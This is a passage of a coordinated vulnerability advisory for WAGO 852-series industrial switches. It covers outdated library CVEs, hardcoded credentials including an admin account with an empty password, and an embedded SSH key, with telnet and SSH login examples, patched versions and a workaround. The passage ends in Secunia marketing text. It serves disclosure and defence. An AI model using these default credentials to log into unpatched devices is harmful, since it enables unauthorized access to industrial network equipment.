CVE-2010-0296, CVE-2010-3856, CVE-2012-4412, CVE-2014-4043, CVE-2014-9402,
CVE-2014-9761, CVE-2014-9984, CVE-2015-1472 and more.

The gethostbyname buffer overflow vulnerability (GHOST) was checked with the help
of the exploit code from <https://seclists.org/oss-sec/2015/q1/274>. It was compiled
and executed on the emulated device to test the system.

3) Hardcoded Credentials (CVE-2019-12550)
The following credentials were found in the 'passwd' file of the firmware:
<Password Hash>                                 <Plaintext>         <User>
<removed>                                       <removed>            root
No password is set for the account              [EMPTY PASSWORD]     admin

By using these credentials, it's possible to connect via Telnet and SSH on the
emulated device. Example for Telnet:
-------------------------------------------------------------------------------
[root@localhost ~]# telnet 192.168.0.133
Trying 192.168.0.133...
Connected to 192.168.0.133.
Escape character is '^]'.

L2SWITCH login: root
Password:
~ #
-------------------------------------------------------------------------------
Example for SSH:
-------------------------------------------------------------------------------
[root@localhost ~]# ssh 192.168.0.133
root@192.168.0.133's password:
~ #
-------------------------------------------------------------------------------

4) Embedded Private Keys (CVE-2019-12549)
The following host key fingerprint is shown by accessing the SSH daemon on
the emulated device:

[root@localhost ~]# ssh 192.168.0.133
The authenticity of host '192.168.0.133 (192.168.0.133)' can't be established.
RSA key fingerprint is SHA256:X5Vr0/x0/j62N/aqZmHz96ojwl8x/I8mfzuT8o6uZso.
RSA key fingerprint is MD5:2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2.

This matches the embedded private key (which has been removed from this advisory):
SSH Fingerprint: 2e:65:85:fc:45:04:bd:68:30:74:51:45:7d:2f:95:e2

Vulnerable / tested versions:

According to the vendor, the following versions are affected:
* 852-303: <v1.2.2.S0
* 852-1305: <v1.1.6.S0
* 852-1505: <v1.1.5.S0

            on 7th June, SEC Consult proposes new advisory release date for
            12th June
2019-06-07: VDE CERT provides security advisory information from WAGO;
            WAGO releases security patches
2019-06-12: Coordinated release of security advisory

Solution:
---------
The vendor provides patches to their customers at their download page. The
following versions fix the issues:
* 852-303: v1.2.2.S0
* 852-1305: v1.1.6.S0
* 852-1505: v1.1.5.S0

According to the vendor, busybox and glibc have been updated and the embedded
private keys are being newly generated upon first boot and after a factory reset.
The root login via Telnet and SSH has been disabled and the admin account is
documented and can be changed by the customer.

Workaround:
-----------
Restrict network access to the device & SSH server.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
